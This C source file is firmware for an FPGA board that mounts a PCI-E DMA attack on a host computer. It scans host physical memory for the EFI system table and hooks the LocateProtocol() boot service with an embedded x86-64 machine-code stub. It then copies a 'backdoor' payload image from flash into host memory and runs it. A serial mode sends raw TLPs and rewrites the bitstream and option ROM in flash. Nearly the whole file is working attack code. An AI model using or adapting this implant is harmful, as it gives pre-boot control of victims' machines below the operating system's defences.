#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <fsl.h>

#include <xil_printf.h>
#include <xil_types.h>
#include <xparameters.h>
#include <xuartlite.h>
#include <xgpio.h>

#include "platform.h"
#include "platform_config.h"
#include "pcie_tlp.h"
#include "axi_dma.h"
#include "axis_pcie.h"
#include "protocol.h"
#include "flash.h"
#include "common.h"
#include "efi.h"
#include "efi_image.h"

// GPIO channel numbers
#define GPIO_CH_READ   1
#define GPIO_CH_WRITE  2

// read GPIO bit
#define GPIO_BIT_GET(_b_) (gpio_read() & (_b_))

// set GPIO bit
#define GPIO_BIT_OFF(_b_) gpio_write((gpio_read() & ~(_b_)))
#define GPIO_BIT_ON(_b_)  gpio_write((gpio_read() | (_b_)))

// obtain PCI-E device ID
#define GPIO_DEV_ID 0xffff
#define GPIO_DEV_ID_GET() GPIO_BIT_GET(GPIO_DEV_ID)

// obtain user button status
#define GPIO_BTN 0x10000
#define GPIO_BTN_GET() GPIO_BIT_GET(GPIO_BTN)

// control LED
#define GPIO_LED 1
#define GPIO_LED_OFF() GPIO_BIT_OFF(GPIO_LED)
#define GPIO_LED_ON() GPIO_BIT_ON(GPIO_LED)

/*
    Minimum and maximum address of EFI_SYSTEM_TABLE
*/
#define EFI_MIN_ADDR    0x010000000
#define EFI_MAX_ADDR    0x100000000

#define EFI_IS_ADDR_VALID(_addr_) ((_addr_) > EFI_MIN_ADDR && \
                                   (_addr_) < EFI_MAX_ADDR && (_addr_) % sizeof(u32) == 0)

/*
    System memory address range to scan for EFI_SYSTEM_TABLE
*/
#define EFI_SCAN_START  0xe0000000
#define EFI_SCAN_END    0x70000000
#define EFI_SCAN_STEP   (0x10 * PAGE_SIZE)

/*
    EFI_SYSTEM_TABLE header signature
*/
#define EFI_ST_SIGNATURE_1  0x20494249 // "IBI "
#define EFI_ST_SIGNATURE_2  0x54535953 // "SYST"

// name of the PE image section where PAYLOAD_CONF structure is located
#define PAYLOAD_CONF_NAME ".conf"

// address of the host physical memory to plant payload image
#define PAYLOAD_ADDR 0xc0000

// address of the host physical memory to plant payload stub
#define STUB_CODE_ADDR 0x10010
#define STUB_FUNC_ADDR 0x10000

#define DELAY_WAIT 1000000

struct PAYLOAD_CONF
{
    u64 backdoor_entry;
    u64 locate_protocol;
    u64 system_table;
};

struct SCAN_CONF
{
    u64 reserved;
    u64 signature;
    u64 addr_start;
    u64 addr_end;
    u64 step;
};

// used to override default EFI_SYSTEM_TABLE scan settings
#define SCAN_CONF_SIGN 0x524444414e414353

#define SCAN_CONF_IS_VALID(_addr_) ((_addr_) >= PAGE_SIZE && \
                                    (_addr_) < EFI_MAX_ADDR && (_addr_) % PAGE_SIZE == 0)

// GPIO device instance
static XGpio m_Gpio;

// UART device instance
static XUartLite m_Uart;

/*
    This stub is used to pass execution to the payload.
    It spins in the loop while DMA attack code is planting payload
    image at PAYLOAD_ADDR (it might take some time) and writing
    its entry point address at STUB_FUNC_ADDR.
*/
static u8 m_stub[] =
{
    0x48, 0xc7, 0xc0, 0x00, 0x00, 0x01, 0x00,   // mov      rax, STUB_FUNC_ADDR
    0x0f, 0xae, 0x38,                           // clflush  [rax]
    0x48, 0x8b, 0x00,                           // mov      rax, [rax]
    0x48, 0x85, 0xc0,                           // test     rax, rax
    0x74, 0xee,                                 // jz       STUB_CODE_ADDR
    0xff, 0xe0                                  // jmp      rax 
};

u32 m_dev_id = 0;

static inline int init_gpio(u32 device_id)
{
    if (XGpio_Initialize(&m_Gpio, device_id) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }

    // set input channel direction
    XGpio_SetDataDirection(&m_Gpio, GPIO_CH_READ, 0xffffffff);

    // set output channel direction
    XGpio_SetDataDirection(&m_Gpio, GPIO_CH_WRITE, 0x00000000);

    return XST_SUCCESS;
}

static inline u32 gpio_read(void)
{
    return XGpio_DiscreteRead(&m_Gpio, GPIO_CH_READ);
}

static inline void gpio_write(u32 mask)
{
    XGpio_DiscreteWrite(&m_Gpio, GPIO_CH_WRITE, mask);
}

static inline int init_uart(u32 device_id)
{
    return XUartLite_Initialize(&m_Uart, device_id);
}

static inline void uart_read(u8 *buff, u32 size)
{
    u32 count = 0;

    while (count < size)
    {
        // read needed amount of bytes
        count += XUartLite_Recv(&m_Uart, buff + count, size - count);
    }
}

static inline void uart_write(u8 *buff, u32 size)
{
    u32 count = 0;

    while (count < size)
    {
        // write needed amount of bytes
        count += XUartLite_Send(&m_Uart, buff + count, size - count);
    }
}

static void mode_serial(void)
{
    bool reset = false;
    u8 buff_rx[sizeof(PROT_CTL) + PROT_MAX_PACKET_SIZE];
    u8 buff_tx[sizeof(PROT_CTL) + PROT_MAX_PACKET_SIZE];

    PROT_CTL *request = (PROT_CTL *)&buff_rx;
    PROT_CTL *reply = (PROT_CTL *)&buff_tx;

    while (!reset)
    {
        bool ignore = false;

        reply->code = PROT_CTL_ERROR_FAILED;
        reply->size = 0;

        // receive request
        uart_read((u8 *)request, sizeof(PROT_CTL));

        if (request->size != 0)
        {
            // receive request data
            uart_read(request->data, (u32)request->size);
        }

        // dispatch client request
        switch (request->code)
        {
        case PROT_CTL_PING:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_PING\n");
#endif
                reply->code = PROT_CTL_SUCCESS;
                break;
            }

        case PROT_CTL_RESET:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_RESET\n");
#endif
                // exit from serial mode
                reset = true;

                reply->code = PROT_CTL_SUCCESS;
                return;
            }

        case PROT_CTL_STATUS:
            {
                u32 device_status = GPIO_DEV_ID_GET();

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_STATUS\n");
#endif
                memcpy(reply->data, &device_status, sizeof(u32));

                reply->size = sizeof(u32);
                reply->code = PROT_CTL_SUCCESS;
                break;
            }

        case PROT_CTL_TLP_SEND:
            {
                u32 size = (u32)request->size;

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_TLP_SEND\n");
#endif
                // send TLP
                int status = tlp_send(request->data, size);
                if (status == XST_SUCCESS)
                {
                    // success
                    reply->code = PROT_CTL_SUCCESS;
                }

                break;
            }

        case PROT_CTL_TLP_RECV:
            {
                u32 size = 0;

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_TLP_RECV\n");
#endif
                // receive TLP
                int status = tlp_recv(reply->data, &size);
                if (status == XST_SUCCESS)
                {
                    // success
                    reply->size = (u8)size;
                    reply->code = PROT_CTL_TLP_RECV;
                }
                else if (status == XST_TIMEOUT)
                {
                    // timeout occurred
                    reply->code = PROT_CTL_ERROR_TIMEOUT;
                }                

                break;
            }

        case PROT_CTL_CONFIG:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_CONFIG\n");
#endif
                if (GPIO_DEV_ID_GET() != 0)
                {
                    u32 cfg_addr = 0, cfg_data = 0;

                    memcpy(&cfg_addr, request->data, sizeof(u32));

                    // read PCI-E config space
                    cfg_data = axis_pcie_read_config(cfg_addr);

                    memcpy(reply->data, &cfg_data, sizeof(u32));

                    reply->size = sizeof(u32);
                    reply->code = PROT_CTL_SUCCESS;
                }
                else
                {
#ifdef VERBOSE
                    xil_printf("recv_callback(): PROT_CTL_CONFIG fails, device is not initialized\n");
#endif
                }

                break;
            }

        case PROT_CTL_TEST:
            {
                if (request->size < PROT_MAX_PACKET_SIZE)
                {
                    reply->size = request->size;
                    reply->code = PROT_CTL_SUCCESS;
                }

                break;
            }

#ifdef USE_ROM

        case PROT_CTL_RESIDENT_ON:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_RESIDENT_ON\n");
#endif
                // not implemented

                // don't send any reply
                ignore = true;
                break;
            }

        case PROT_CTL_RESIDENT_OFF:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_RESIDENT_OFF\n");
#endif
                // not implemented

                // don't send any reply
                ignore = true;
                break;
            }

        case PROT_CTL_BIT_WRITE:
            {
                PROT_CTL_ROM *rom_write = (PROT_CTL_ROM *)&request->data;

                if (request->size > sizeof(PROT_CTL_ROM))
                {
                    request->size -= sizeof(PROT_CTL_ROM);
                }
#ifdef VERBOSE
                xil_printf(
                    "recv_callback(): PROT_CTL_BIT_WRITE: offset = 0x%x, size = 0x%x\n",
                    rom_write->offset, request->size
                );
#endif
                if (rom_write->offset + request->size < BIT_SPI_SIZE)
                {
                    // enable SPI flash write access
                    if (spi_flash_write_enable(COMMAND_WRITE_ENABLE) == XST_SUCCESS)
                    {
                        // write bitstream contents into the flash
                        if (spi_flash_write(BIT_SPI_ADDR + rom_write->offset, 
                                            rom_write->data, request->size) == XST_SUCCESS)
                        {
                            reply->code = PROT_CTL_SUCCESS;
                        }
                    }
                }
                else
                {
#ifdef VERBOSE
                    xil_printf("recv_callback() ERROR: Bad bitstream offset\n");       
#endif
                }

                break;
            }

         case PROT_CTL_BIT_ERASE:
            {
                u32 ptr = 0;
#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_BIT_ERASE\n");
#endif
                reply->code = PROT_CTL_SUCCESS;

                for (ptr = 0; ptr < BIT_SPI_SIZE; ptr += FLASH_BLOCK_SIZE)
                {
                    // enable SPI flash write access
                    if (spi_flash_write_enable(COMMAND_WRITE_ENABLE) != XST_SUCCESS)
                    {
                        reply->code = PROT_CTL_ERROR_FAILED;
                        break;
                    }

                    // erasse single block
                    if (spi_flash_block_erase(BIT_SPI_ADDR + ptr) != XST_SUCCESS)
                    {
                        reply->code = PROT_CTL_ERROR_FAILED;
                        break;
                    }
                }

                break;
            }

        case PROT_CTL_ROM_WRITE:
            {
                PROT_CTL_ROM *rom_write = (PROT_CTL_ROM *)&request->data;

                if (request->size > sizeof(PROT_CTL_ROM))
                {
                    request->size -= sizeof(PROT_CTL_ROM);
                }
#ifdef VERBOSE
                xil_printf(
                    "recv_callback(): PROT_CTL_ROM_WRITE: offset = 0x%x, size = 0x%x\n",
                    rom_write->offset, request->size
                );
#endif
                if (rom_write->offset + request->size < ROM_SPI_SIZE)
                {
                    // enable SPI flash write access
                    if (spi_flash_write_enable(COMMAND_WRITE_ENABLE) == XST_SUCCESS)
                    {
                        // write option ROM contents into the flash
                        if (spi_flash_write(ROM_SPI_ADDR + rom_write->offset, 
                                            rom_write->data, request->size) == XST_SUCCESS)
                        {
                            reply->code = PROT_CTL_SUCCESS;
                        }
                    }
                }
                else
                {
#ifdef VERBOSE
                    xil_printf("recv_callback() ERROR: Bad option ROM offset\n");       
#endif
                }

                break;
            }

        case PROT_CTL_ROM_ERASE:
            {
                u32 ptr = 0;
#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_ROM_ERASE\n");
#endif
                reply->code = PROT_CTL_SUCCESS;

                for (ptr = 0; ptr < ROM_SPI_SIZE; ptr += FLASH_BLOCK_SIZE)
                {
                    // enable SPI flash write access
                    if (spi_flash_write_enable(COMMAND_WRITE_ENABLE) != XST_SUCCESS)
                    {
                        reply->code = PROT_CTL_ERROR_FAILED;
                        break;
                    }

                    // erasse single block
                    if (spi_flash_block_erase(ROM_SPI_ADDR + ptr) != XST_SUCCESS)
                    {
                        reply->code = PROT_CTL_ERROR_FAILED;
                        break;
                    }
                }

                break;
            }

        case PROT_CTL_ROM_LOG_ON:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_ROM_LOG_ON\n");
#endif
                // not implemented

                // don't send any reply
                ignore = true;
                break;
            }

        case PROT_CTL_ROM_LOG_OFF:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_ROM_LOG_OFF\n");
#endif
                // not implemented

                // don't send any reply
                ignore = true;
                break;
            }

        case PROT_CTL_ROM_SIZE:
            {
                u32 rom_size = ROM_SPI_SIZE;
#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_ROM_SIZE\n");
#endif
                memcpy(reply->data, &rom_size, sizeof(u32));

                reply->size = sizeof(u32);
                reply->code = PROT_CTL_SUCCESS;
                break;
            }

#endif // USE_ROM

        default:
            {

#ifdef VERBOSE
                xil_printf("recv_callback() ERROR: Unknown code\n");
#endif
                break;
            }
        }

        if (!ignore)
        {
            // send reply to the client
            uart_write((u8 *)reply, sizeof(PROT_CTL) + reply->size);
        }
    }
}

static void delay(void)
{
    for (u32 i = 0; i < DELAY_WAIT; i += 1)
    {
        // ...
    }
}

static int scan_image(u64 addr, u64 *system_table)
{
    struct dos_header dos_hdr;
    struct pe64_nt_headers nt_hdr;    

    // read DOS header
    if (mem_read(addr, (u8 *)&dos_hdr, sizeof(dos_hdr)) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }

    if (dos_hdr.e_lfanew > PAGE_SIZE)
    {
        return XST_FAILURE;
    }

    // read NT headers
    if (mem_read(addr + dos_hdr.e_lfanew, (u8 *)&nt_hdr, sizeof(nt_hdr)) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }

    if (nt_hdr.signature != PE_SIGNATURE)
    {
        return XST_FAILURE;   
    }    

    // verify machine and subsystem
    if (nt_hdr.file_header.machine != PE32_MACHINE_X86_64 || 
        (nt_hdr.optional_header.subsystem != SUBSYSTEM_EFI_APPLICATION &&
         nt_hdr.optional_header.subsystem != SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER &&
         nt_hdr.optional_header.subsystem != SUBSYSTEM_EFI_RUNTIME_DRIVER &&
         nt_hdr.optional_header.subsystem != SUBSYSTEM_EFI_ROM))
    {
        return XST_FAILURE;
    }

    xil_printf("EFI image is at 0x%llx\n", addr);

    // scan image contents
    for (u32 ptr = nt_hdr.optional_header.header_size; 
             ptr < nt_hdr.optional_header.image_size; ptr += sizeof(u64))
    {
        u64 val = 0;
        u32 sig = 0;

        // read single pointer from the image
        if (mem_read(addr + ptr, (u8 *)&val, sizeof(val)) != XST_SUCCESS)
        {            
            continue;
        }
        
        // check for the sane pointer value
        if (!EFI_IS_ADDR_VALID(val))
        {
            continue;
        }

        if (mem_read(val, (u8 *)&sig, sizeof(sig)) == XST_SUCCESS)
        {       
            // check for the first half of EFI_SYSTEM_TABLE signature
            if (sig == EFI_ST_SIGNATURE_1)
            {
                if (mem_read(val + sizeof(u32), (u8 *)&sig, sizeof(sig)) == XST_SUCCESS)
                {       
                    // check for the second half of EFI_SYSTEM_TABLE signature
                    if (sig == EFI_ST_SIGNATURE_2)
                    {
                        // found
                        *system_table = val;
                        
                        return XST_SUCCESS;
                    }
                }
            }
        }
    }

    return XST_FAILURE;
}

static int scan_memory(u64 addr_start, u64 addr_end, u64 step, u64 *system_table)
{
    xil_printf("scan_memory(): start = 0x%llx\n", addr_start);
    xil_printf("scan_memory():   end = 0x%llx\n", addr_end);
    xil_printf("scan_memory():  step = 0x%llx\n", step);

    // scan memory range
    for (u64 addr = addr_start; addr > addr_end; addr -= step)
    {
        u32 val = 0;

        if (mem_read(addr, (u8 *)&val, sizeof(val)) == XST_SUCCESS)
        {            
            // check for the DOS header signature
            if (val == DOS_SIGNATURE)
            {
                // scan PE image
                if (scan_image(addr, system_table) == XST_SUCCESS)
                {
                    return XST_SUCCESS;
                }
            }
        }
    }

    return XST_FAILURE;
}

static int rom_read(u32 addr, u8 *buff, u32 size)
{
    u32 ptr = 0;

    while (ptr < size)
    {
        // read single flash page
        if (spi_flash_read(
            ROM_SPI_ADDR + addr + ptr, buff + ptr, 
            MIN(FLASH_PAGE_SIZE, size - ptr), COMMAND_RANDOM_READ) != XST_SUCCESS)
        {
            xil_printf("ERROR: spi_flash_read() fails\n");

            return XST_FAILURE;
        }

        ptr += FLASH_PAGE_SIZE;
    }

    return XST_SUCCESS;
}

static int rom_info(u64 *image_base, u32 *image_size, u32 *image_conf)
{
    struct dos_header dos_hdr;
    struct pe64_nt_headers nt_hdr;    

    // read DOS header
    if (rom_read(0, (u8 *)&dos_hdr, sizeof(dos_hdr)) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }

    if (dos_hdr.e_magic != DOS_SIGNATURE)
    {
        xil_printf("ERROR: bad payload DOS signature\n");
        return XST_FAILURE;
    }

    // read NT headers
    if (rom_read(dos_hdr.e_lfanew, (u8 *)&nt_hdr, sizeof(nt_hdr)) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }

    if (nt_hdr.signature != PE_SIGNATURE)
    {
        xil_printf("ERROR: bad payload NT signature\n");
        return XST_FAILURE;
    }

    xil_printf("Image size is 0x%lx\n", nt_hdr.optional_header.image_size);

    if (nt_hdr.optional_header.section_alignment != 
        nt_hdr.optional_header.file_alignment)
    {
        xil_printf("ERROR: bad payload alignment\n");
        return XST_FAILURE;
    }

    u32 sec_addr = dos_hdr.e_lfanew + 
        OFFSET_OF(struct pe64_nt_headers, optional_header) + 
        nt_hdr.file_header.optional_header_size;

    // enumerate section
    for (u16 i = 0; i < nt_hdr.file_header.num_sections; i += 1)
    {
        struct pe32_section_header sec_hdr;

        // read section header
        if (rom_read(sec_addr, (u8 *)&sec_hdr, sizeof(sec_hdr)) != XST_SUCCESS)
        {
            return XST_FAILURE;
        }

        xil_printf(
            "Section #%d addr = 0x%x, size = 0x%x\n", 
            i, sec_hdr.virtual_address, sec_hdr.virtual_size
        );

        if (!strcmp(sec_hdr.name, PAYLOAD_CONF_NAME))
        {
            *image_conf = sec_hdr.virtual_address;
        }

        *image_size = sec_hdr.raw_data_offset + sec_hdr.raw_data_size;

        sec_addr += sizeof(struct pe32_section_header);
    }

    *image_base = nt_hdr.optional_header.image_base;

    return XST_SUCCESS;
}

static void mode_standalone(void)
{
    u64 image_base = 0;
    u32 image_size = 0, image_conf = 0;
    u64 scan_start = EFI_SCAN_START, scan_end = EFI_SCAN_END, scan_step = EFI_SCAN_STEP;
    struct SCAN_CONF scan_conf;

    xil_printf("mode_standalone(): Starting attack...\n");

    // get information about payload
    if (rom_info(&image_base, &image_size, &image_conf) != XST_SUCCESS)
    {
        xil_printf("Payload is not present\n");  
        return;
    }

    if (image_conf == 0)
    {
        xil_printf("Payload config is not found\n");
        return;   
    }

    xil_printf("Payload size is %d bytes\n", image_size);
    xil_printf("Payload config RVA is 0x%x\n", image_conf);

    // read SCAN_CONF structure from the DOS header of payload image
    if (rom_read(0, (u8 *)&scan_conf, sizeof(scan_conf)) != XST_SUCCESS)
    {
        xil_printf("ERROR: rom_read() fails\n");
        return;
    }

    // check for SCAN_CONF present
    if (scan_conf.signature == SCAN_CONF_SIGN)
    {
        // sanity check start and end address
        if (SCAN_CONF_IS_VALID(scan_conf.addr_start) &&
            SCAN_CONF_IS_VALID(scan_conf.addr_end) && scan_conf.addr_start > scan_conf.addr_end)
        {
            xil_printf("Overriding default scan_start value\n");
            xil_printf("Overriding default scan_end value\n");

            scan_start = scan_conf.addr_start;
            scan_end = scan_conf.addr_end;

            // sanity check scan step
            if (SCAN_CONF_IS_VALID(scan_conf.step))
            {
                xil_printf("Overriding default scan_step value\n");

                scan_step = scan_conf.step;
            }
        }
        else
        {
            xil_printf("SCAN_CONF is invalid\n");
        }
    }
    else
    {
        xil_printf("SCAN_CONF is not present\n");
    }

    xil_printf("Waiting for PCI-E endpoint to be ready...\n");

    while ((m_dev_id = GPIO_DEV_ID_GET()) == 0)
    {
        // wait for the endpoint to be intinialized
        delay();
    }

    u32 val = 0;

    while (mem_read(0, (u8 *)&val, sizeof(val)) == XST_FAILURE)
    {        
        // wait for the root complex to be ready to accept memory access requests
        delay();

        m_dev_id = GPIO_DEV_ID_GET();
    }

    xil_printf(
        "dev_id = %d:%d.%d\n",
        (u32)((m_dev_id >> 8) & 0xff), (u32)((m_dev_id >> 3) & 0x1f), 
        (u32)((m_dev_id >> 0) & 0x07)
    );

    u64 system_table = 0, boot_services = 0, locate_protocol = 0;
    u64 stub_addr = STUB_CODE_ADDR, stub_zero = 0;

    xil_printf("Starting memory scan...\n");

    // scan system memory to find EFI_SYSTEM_TABLE
    if (scan_memory(scan_start, scan_end, scan_step, &system_table) != XST_SUCCESS)
    {
        xil_printf("Unable to find EFI_SYSTEM_TABLE\n");   
        return;
    }

    xil_printf("EFI_SYSTEM_TABLE is at 0x%llx\n", system_table);

    if (mem_read(
        system_table + OFFSET_OF(struct efi_system_table, boot_services),
        (u8 *)&boot_services, sizeof(boot_services)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_read() fails\n");
        return;
    }

    if (!EFI_IS_ADDR_VALID(boot_services))
    {
        xil_printf("Invalid EFI_BOOT_SERVICES address\n");   
        return;
    }

    xil_printf("EFI_BOOT_SERVICES is at 0x%llx\n", boot_services);

    if (mem_read(
        boot_services + OFFSET_OF(struct efi_boot_services, locate_protocol),
        (u8 *)&locate_protocol, sizeof(locate_protocol)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_read() fails\n");
        return;
    }
    
    if (locate_protocol < EFI_MIN_ADDR || locate_protocol > EFI_MAX_ADDR)
    {
        xil_printf("Invalid LocateProtocol() address\n");
        return;
    }

    xil_printf("LocateProtocol() is at 0x%llx\n", locate_protocol);

    xil_printf("Payload stub is at 0x%x\n", stub_addr);

    // stub will spin in the loop untill this value is zero
    if (mem_write(STUB_FUNC_ADDR, (u8 *)&stub_zero, sizeof(stub_zero)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_write() fails\n");
        return;   
    }

    // write payload stub into the host physical memory
    if (mem_write(stub_addr, m_stub, sizeof(m_stub)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_write() fails\n");
        return;   
    }

    // patch LocateProtocol() address
    if (mem_write(
        boot_services + OFFSET_OF(struct efi_boot_services, locate_protocol),
        (u8 *)&stub_addr, sizeof(stub_addr)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_write() fails\n");
        return;
    }

    xil_printf("Payload is at 0x%x\n", PAYLOAD_ADDR);

    u32 ptr = 0;    

    while (ptr < image_size)
    {
        u8 buff[FLASH_PAGE_SIZE];    
        u32 read_size = MIN(FLASH_PAGE_SIZE, image_size - ptr);

        // read payload from flash
        if (spi_flash_read(
            ROM_SPI_ADDR + ptr, buff, read_size, COMMAND_RANDOM_READ) != XST_SUCCESS)
        {
            xil_printf("ERROR: spi_flash_read() fails\n");
            return;
        }

        read_size = ALIGN_UP(read_size, sizeof(u32));

        // witte payload into the host physical memory
        if (mem_write(PAYLOAD_ADDR + ptr, buff, read_size) != XST_SUCCESS)
        {
            xil_printf("ERROR: mem_write() fails\n");
            return;   
        }

        ptr += FLASH_PAGE_SIZE;
    }

    u64 image_entry = 0;
    u64 conf_addr = PAYLOAD_ADDR + image_conf;

    // read payload image entry from PAYLOAD_CONF
    if (mem_read(
        conf_addr + OFFSET_OF(struct PAYLOAD_CONF, backdoor_entry), 
        (u8 *)&image_entry, sizeof(image_entry)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_read() fails\n");
        return;
    }

    image_entry -= image_base;
    image_entry += PAYLOAD_ADDR;

    xil_printf("Payload entry is at 0x%llx\n", image_entry);

    // pass EFI_SYSTEM_TABLE address to the payload
    if (mem_write(
        conf_addr + OFFSET_OF(struct PAYLOAD_CONF, system_table), 
        (u8 *)&system_table, sizeof(system_table)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_write() fails\n");
        return;
    }

    // pass LocateProtocol() address to the payload
    if (mem_write(
        conf_addr + OFFSET_OF(struct PAYLOAD_CONF, locate_protocol), 
        (u8 *)&locate_protocol, sizeof(locate_protocol)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_write() fails\n");
        return;
    }

    // resume stub execution
    if (mem_write(STUB_FUNC_ADDR, (u8 *)&image_entry, sizeof(image_entry)) != XST_SUCCESS)
    {
        xil_printf("ERROR: mem_write() fails\n");
        return;
    }

    xil_printf("mode_standalone(): Completed\n");
}

int main(void)
{
    init_platform();

    // initialize UART
    if (init_uart(DEVICE_ID_UART) != XST_SUCCESS)
    {
        xil_printf("ERROR: init_uart() fails\n");
        return -1;
    }

    // initialize GPIO
    if (init_gpio(DEVICE_ID_GPIO) != XST_SUCCESS)
    {
        xil_printf("ERROR: init_gpio() fails\n");
        return -1;
    }

    // initialize SPI flash
    if (spi_flash_initialize() != XST_SUCCESS)
    {
        xil_printf("ERROR: spi_flash_initialize() fails\n");
        return -1;   
    }

    // initialize AXI DMA engine
    if (axi_dma_initialize() != XST_SUCCESS)
    {
        xil_printf("ERROR: axi_dma_initialize() fails\n");
        return -1;
    }

    // check user button state
    if (GPIO_BTN_GET() != 0)
    {
        GPIO_LED_ON();

        // go to the serial controlled mode
        mode_serial();
    }

    GPIO_LED_OFF();

    // go to the autonomous mode
    mode_standalone();

    cleanup_platform();

    return 0;
}
